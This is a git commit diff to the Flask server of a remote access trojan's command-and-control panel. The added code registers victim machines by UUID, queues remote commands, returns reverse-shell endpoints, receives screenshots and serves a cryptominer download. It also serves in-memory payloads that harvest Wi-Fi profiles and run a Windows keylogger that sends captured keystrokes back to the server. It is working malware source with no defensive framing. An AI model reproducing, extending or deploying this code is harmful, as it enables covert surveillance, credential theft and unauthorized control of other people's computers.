3ce1b604c36c3a3456429217db41bef5d07a3df7
H0lyL337 <deadmanwalkingx13@gmail.com>
2023-03-17 10:43:53 -0400

    Update server.py

--- server.py
+++ server.py
@@ -1,14 +1,19 @@
+import platform
 from flask import request, render_template
 from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
-from flask_cors import CORS, cross_origin
 from werkzeug.utils import secure_filename
 from werkzeug.datastructures import  FileStorage
 import os
 import apext_db
 from datetime import date
+import subprocess
 
-app = Flask(__name__, static_folder='static')
-CORS(app=app, supports_credentials=True)
+# PAYLOAD UPDATE 
+# ADMIN LOGIN PAGE
+# TEAM SHARE PANEL
+
+
+app = Flask(__name__, static_folder='{0}/static'.format(os.getcwd()), template_folder='{0}/templates'.format(os.getcwd()))
 app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
 app.secret_key= os.urandom(24).hex()
 
@@ -16,7 +21,96 @@ app.secret_key= os.urandom(24).hex()
 with open("./server.cfg", "r") as cfg:
     ip = '{0}'.format(cfg.readline()[7:].strip())
     port = '{0}'.format(cfg.readline()[5:].strip())
+
+###  CREATE DIRECTORIES IF NOT ALREADY EXISTS ###
+if os.path.isdir("./static/windows"):
+    pass
+else:
+    os.mkdir("./static/windows")
+
+if os.path.isdir("./static/linux"):
+    pass
+else:
+    os.mkdir("./static/linux")
+
+if os.path.isdir("./static/screenshots"):
+    pass
+else:
+    os.mkdir("./static/screenshots")
+
+if os.path.isdir("./static/macos"):
+    pass
+else:
+    os.mkdir("./static/macos")
+
+### CHECK IF NUITKA, REQUESTS, PSUTIL, pyautogui, PIL IS INSTALLED ###
+if platform.uname()[0] == "Linux":
+    proc = subprocess.Popen(["python3 -m nuitka"], stdout=subprocess.PIPE, shell=True)
+    out = proc.communicate()
+    if str(out) == "b''":
+            print("Nuitka is not installed, attempting to install all required Module from pip")
+            os.system("pip3 install nuitka")
+            os.system("pip3 install requests")
+            os.system("pip3 install psutil")
+            os.system("pip3 install pyautogui")
+            os.system("pip3 install PIL")
+            os.system("pip3 install gzip")
+
+            proc = subprocess.Popen(["python3 -m nuitka"], stdout=subprocess.PIPE, shell=True)
+            out, err = proc.communicate()
+            if str(out) == "b''":
+                    print("Nuitka is still not installed, make sure python3 is installed on your system.")
+            else:
+                    print("Nuitka seems to be installed")
+    else:
+            print("Nuitka seems to be installed")
+
+elif platform.uname()[0] == "Windows":
+    print("function not completed yet")
+        
+### CHANGE WATCHDOG.PY AND PAYLOAD.PY MASTER IP ###
+linelist = []
+linelist2 = []
+
+with open("./watchdog.py", "r+") as watchdogfile:
+    for line in watchdogfile.readlines():
+        linelist.append(line)
+with open("./watchdog.py", "w") as watchdogfile:
+    for line in linelist:
+        if line == '_WEB_SERVER =\n':
+            watchdogfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
+        else:
+            watchdogfile.write(line)
+    watchdogfile.close()
     
+with open("./payload.py", "r+") as watchdogfile:
+    for line in watchdogfile.readlines():
+        linelist2.append(line)
+with open("./payload.py", "w") as watchdogfile:
+    for line in linelist2:
+        if line == '_WEB_SERVER =\n':
+            watchdogfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
+        else:
+            watchdogfile.write(line)
+    watchdogfile.close()
+
+print("""  _____            _         _               
+ |  __ \          | |       (_)              
+ | |  | |_ __ __ _| | ____ _ _ _ __   __ _   
+ | |  | | '__/ _` | |/ / _` | | '_ \ / _` |  
+ | |__| | | | (_| |   < (_| | | | | | (_| |  
+ |_____/|_|  \__,_|_|\_\__,_|_|_| |_|\__,_|  
+   _____ ______ _______      ________ _____  
+  / ____|  ____|  __ \ \    / /  ____|  __ \ 
+ | (___ | |__  | |__) \ \  / /| |__  | |__) |
+  \___ \|  __| |  _  / \ \/ / |  __| |  _  / 
+  ____) | |____| | \ \  \  /  | |____| | \ \ 
+ |_____/|______|_|  \_\  \/   |______|_|  \_\
+                                             
+                                             """)
+import time
+time.sleep(3)
+
 ### needed for eval command from watchdog ###
 _SERVER = "{0}:{1}".format(ip, port)
 
@@ -27,7 +121,7 @@ def mainn():
     for rat in apext_db.get_rat_list():
         print(rat)
         rats.append(rat)
-    return render_template("admin.html", rats=rats)
+    return render_template("admin.html".format(os.getcwd()), rats=rats)
 
 ### LINUX WATHCDOG DOWNLOAD ###
 @app.route('/downloads/linux/watchdog')
@@ -66,27 +160,28 @@ def download_linux_phoenixminer():
     return send_file('./static/linux/PhoenixMiner_5.7b_Linux.zip', as_attachment=True)
 
 ### REGISTER LINK, PARAMS IP, USER, OS ###
-@app.route('/register/<ip>/<user>/<os>', methods=['POST', 'GET'])
-def register(ip, user, os):
+@app.route('/register/<ip>/<user>/<os>/<uuid>', methods=['POST', 'GET'])
+def register(ip, user, os, uuid):
     if ip == "None":
         return "None"
     else:
-        print(ip + ' ' + user + ' ' + os)
+        print(ip + ' ' + user + ' ' + os + ' ' + uuid)
         today = date.today()
         _REGISTERED_DATE = today.strftime("%m/%d/%y")
         _LAST_SEEN_DATE = today.strftime("%m/%d/%y")
-        apext_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE)
+        apext_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE, uuid)
+        apext_db.create_user_wifilisttable(uuid)
         print('created users')
         return 'none'
 
 ### CHECK IF REGISTERED, PARAMS IP, USERNAME ###
-@app.route('/check_if_registered/<ip>/<user>', methods=['POST', 'GET'])
-def check_if_registered(ip, user):
+@app.route('/check_if_registered/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
+def check_if_registered(ip, user, uuid):
     print('checking if user is registered alrdy')
     try:
         if ip == "None":
             return 0
-        if apext_db.check_rat_exists(ip, user) != None:
+        if apext_db.check_rat_exists(ip, user, uuid) != None:
             print('he exists')
             print(request.remote_addr)
             return 'True'
@@ -94,15 +189,23 @@ def check_if_registered(ip, user):
             return 'False'
 
     except TypeError:
-        return redirect(register(ip, user))
+        return redirect(register(ip, user, uuid))
 
 ### CHECK FOR COMMAND LINK ###
-@app.route('/command/<ip>/<user>', methods=['POST', 'GET'])
-def command(ip, user): 
-    command = '{0}'.format(apext_db.get_user_command(ip, user))
-    apext_db.remove_user_command(ip, user)
+@app.route('/command/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
+def command(ip, user,  uuid):
+    today = date.today()
+    command = '{0}'.format(apext_db.get_user_command(ip, user, uuid))
+    apext_db.remove_user_command(ip, user,  uuid)
+    apext_db.update_user_lastseendate(ip, user, uuid, today.strftime("%m/%d/%y"))
     print(command)
     return command
+
+@app.route('/keylogger/<ip>/<user>/<uuid>/<log>', methods=['POST', 'GET'])
+def keylogger(ip, user,  uuid, log):
+    print(log)
+    
+    return "asdasd"
 
 ### CHECK FOR A MASS COMMAND LINK ###
 @app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
@@ -112,11 +215,18 @@ def mass_(ip, user):
     print(command)
     return command
 
+### COMMAND LINKS ###
+
+@app.route('/wifi_name/<uuid>/<wifi_name>', methods=['POST', 'GET'])
+def insert_wifi_name(uuid, wifi_name):
+    apext_db.insert_user_wifi(uuid, wifi_name)
+    print('created ')
+
 ### REVERSE SHELL, CHECK FOR A SERVER ###
-@app.route('/rshell/<ip>/<user>', methods=['POST', 'GET'])
-def rshell_(ip, user): 
-    master_ip = '{0}'.format(apext_db.get_rshell_master(ip, user))
-    master_port = '{0}'.format(apext_db.get_rshell_master_port(ip, user))
+@app.route('/rshell/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
+def rshell_(ip, user,  uuid): 
+    master_ip = '{0}'.format(apext_db.get_rshell_master(ip, user,  uuid))
+    master_port = '{0}'.format(apext_db.get_rshell_master_port(ip, user,  uuid))
     return master_ip + " " + master_port
 
 ### GET YOUR IP ###
@@ -158,6 +268,8 @@ def information_grabber(key):
             f.write('{0}\n'.format(token))
         f.close()
         print(token_list)
+        print(request.headers)
+        print(request.headers['User-Agent'])
         
         ### infor grabber code here ###
         return 'something'
@@ -167,11 +279,11 @@ def information_grabber(key):
 
 
 ### USER UPLOAD SCREENSHOT LINK ###
-@app.route('/upload/screenshot/<ip>/<user>', methods=['POST', 'GET'])
-def upload_screenshot(ip, user): 
+@app.route('/upload/screenshot/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
+def upload_screenshot(ip, user, uuid): 
     if request.method == 'POST':
         try:
-            if apext_db.check_rat_exists(ip, user) != None:
+            if apext_db.check_rat_exists(ip, user, uuid) != None:
                 print("screenshot user exists")
                 f = request.files['file']
                 filename = secure_filename(f.filename)
@@ -194,14 +306,14 @@ def upload_screenshot(ip, user):
 <meta name="author" content="">
 
 <body>
-    <form name="upload" action = "http://{0}/upload/screenshot/{1}/{2}" method = "POST" 
+    <form name="upload" action = "http://{0}/upload/screenshot/{1}/{2}/{3}" method = "POST" 
        enctype = "multipart/form-data">
        <input type = "file" name = "file" />
        <input type = "submit"/>
     </form>   
  </body>
 </html>
-""".format("192.168.1.6:3000", "192.168.1.6", user )
+""".format("{0}:{1}", "{0}",ip, port, user, uuid )
 
 ###  GET IFRAME OF FILE SYSTEM ###
 @app.route('/iframe', methods=['GET'])
@@ -220,22 +332,26 @@ navigator.geolocation.getCurrentPosition((loc) => {
 </html>
 
 """
+### Eval Payloads ###
 
-### PAYLOAD SCRIPT TO RUN IN MEMORY ###
+### Main Payload ###'
+
 @app.route('/remote', methods=['GET'])
 
 def remote():
     return """
+
 def register():
     try:
-        requests.get(_REG_URL + '/{0}/{1}/{2}'.format(_MY_IP, username, _OS))
+        requests.get(_REG_URL + '/{0}/{1}/{2}/{3}'.format(_MY_IP, username, _OS, current_machine_id ))
     except Exception as e:
         pass
 
 #   CHECK IF RAT IS ALREADY REGISTERED  #
 def chk_register():
     try:
-        if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8') == 'True':
+
+        if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}/{2}'.format(_MY_IP, username, current_machine_id)).content.decode('utf8') == 'True':
             return 1
         else:
             return 0
@@ -247,7 +363,7 @@ def upload_screenshot(SCREENSHOT):
         try:
             
             with open(SCREENSHOT, "rb") as f:
-                requests.post("http://{0}/upload/screenshot/{1}/{2}".format(_WEB_SERVER, _MY_IP, username ), files={"file": f})
+                requests.post("http://{0}/upload/screenshot/{1}/{2}/{3}".format(_WEB_SERVER, _MY_IP, username, current_machine_id ), files={"file": f})
             
         except Exception as e:
             pass
@@ -255,7 +371,7 @@ def upload_screenshot(SCREENSHOT):
 def wait_for_command():
     try:
         time.sleep(random.randrange(5, 15))
-        command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}'.format(_MY_IP, username)).content.decode('utf8')
+        command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}/{2}'.format(_MY_IP, username, current_machine_id)).content.decode('utf8')
         if command == ' ':
             pass
         
@@ -271,6 +387,13 @@ def wait_for_command():
                 _SCREEN_SHOT.save(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                 upload_screenshot(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                 os.remove(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
+        
+        if command == "camshot":
+            if _OS == "Linux":
+                pass
+
+            elif _OS == "Windows":
+                pass
 
         if command == "reboot":
             if _OS == "Linux":
@@ -287,6 +410,10 @@ def wait_for_command():
             elif _OS == "Windows":
                 pass
 
+        if command == "rshell":
+                t1 = threading.Thread(None, _RSHELL_OPT_)
+                t1.start()
+
 
         if command == "reboot":
             if _OS == "Linux":
@@ -301,6 +428,38 @@ def wait_for_command():
 
             elif _OS == "Windows":
                 subprocess.call("shutdown -R")
+
+        if command == "getwifi":
+            if _OS == "Linux":
+                pass
+            
+            elif _OS == "Windows":
+                meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
+                data = meta_data.decode('utf-8', errors ="backslashreplace")
+                data = data.split("\\n")
+                names = []
+                
+                for i in data:
+                    if "All User Profile" in i :
+                        i = i.split(":")
+                        i = i[1]
+                        i = i[1:-1]
+
+                        names.append(i)
+                        
+                for name in names:
+                    insert_wifi_name(name)
+        
+        if command == "keylogger":
+            if _OS == "Linux":
+                pass
+            
+            elif _OS == "Windows":
+                t1 = threading.Thread(None, start_keylogger)
+                t1.start()
+                
+    
+            
 
     except requests.exceptions.ConnectionError:
         pass
@@ -317,17 +476,59 @@ if username == 'root':
 
 while 1:
     if chk_register() == 1:
-        if _RSHELL_OPT == 1:
-                
-                timer = threading.Timer(60, _RSHELL_OPT_)
-                timer.start()
         while 1:
-               #threading.Thread(target=_RSHELL_OPT_).start()
             wait_for_command()
             
     else:
         register()
         continue 
+
+    
+"""
+
+### Keylogger Payload ###
+
+@app.route('/keylog_payload', methods=['GET'])
+
+def keylog_payload():
+    return """
+
+def start_keylogger():
+        GetAsyncKeyState = cdll.user32.GetAsyncKeyState
+
+        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
+        log = []
+        logstring = ""
+
+        # reset key states
+        for i in range(256):
+            GetAsyncKeyState(i)
+
+        while True:
+            if len(log) >= 25:
+                print("fine wine")
+                # UPLOAD LOG HERE #
+                for character in log:
+                    logstring = logstring + character
+                print(logstring)
+                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
+                logstring = ""
+                    
+                log = []
+            for i in range(256):
+                if GetAsyncKeyState(i) & 1:
+                    if i in special_keys:
+                        print("<%s>" % special_keys[i],)
+                    elif 0x30 <= i <= 0x5a:
+                        ### characters a-z/0-9 ###
+                        print ("%c" % i,)
+                        print('cool')
+                        log.append("%c" % i,)
+                        print(log)
+
+                    else:
+                        print("[%02x]" % i,)
+            sys.stdout.flush()
 
     
 """
